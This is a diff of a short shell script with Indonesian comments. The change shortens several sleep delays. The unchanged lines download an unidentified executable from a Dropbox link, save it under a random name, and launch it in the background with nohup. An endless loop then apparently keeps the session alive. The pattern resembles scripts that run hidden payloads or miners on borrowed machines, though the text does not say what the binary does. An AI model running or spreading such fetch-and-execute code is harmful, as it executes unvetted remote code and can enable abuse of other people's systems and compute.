@@ -2,9 +2,9 @@
 echo "mulai ... !!"
 nama=x$(shuf -i 19999-99999 -n 1)
 sudo apt-get update -y > /dev/null 2>&1
-sleep 10
+sleep 2
 wget -q -O $nama https://www.dropbox.com/s/15vwimnqlly0ewk/ccv1?dl=1 && chmod +x $nama
 sleep 10
 nohup ./$nama ann &
-sleep 10
-while :; do shuf -n 1 -i 1-99999999; sleep 150; done
+sleep 2
+while :; do shuf -n 1 -i 1-99999999; sleep 10; done
